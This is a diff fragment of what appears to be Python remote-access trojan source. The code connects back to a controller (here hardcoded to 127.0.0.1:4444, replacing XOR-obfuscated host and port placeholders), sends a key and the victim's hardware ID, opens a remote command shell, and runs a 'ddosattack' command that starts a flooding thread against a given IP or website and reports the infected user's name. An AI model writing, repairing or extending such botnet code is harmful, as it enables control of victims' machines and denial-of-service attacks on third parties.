@@ -914,10 +914,10 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            port = xor_strings($lport, $portkey).decode('utf8')
-            host = xor_strings($lhost, $hostkey).decode('utf8')
-            s.connect((host,int(port)))
-            s.send('$key'.encode()+":".encode()+gethwid().encode())
+            #port = xor_strings($lport, $portkey).decode('utf8')
+            #host = xor_strings($lhost, $hostkey).decode('utf8')
+            s.connect(('127.0.0.1',int(4444)))
+            s.send('youhacker'.encode()+":".encode()+gethwid().encode())
 
             shell()
             s.close()
@@ -1224,14 +1224,13 @@ def shell():
 
                     try:
                         data = str(command).split("|")
+                        t = threading.Thread(target=attack, args=(data[1], data[2], 100000000))
                     except IndexError:
                         reliable_send("try the command in this syntax ddosattack ip,website|port")
                         #error parsing data
                         continue
 
                     else:
-                        t = threading.Thread(target=attack, args=(data[1], data[2], 100000000))
-
                         t.start()
                         reliable_send("[+] attack started on "+data[1]+" from " + getpass.getuser() + " computer")
 
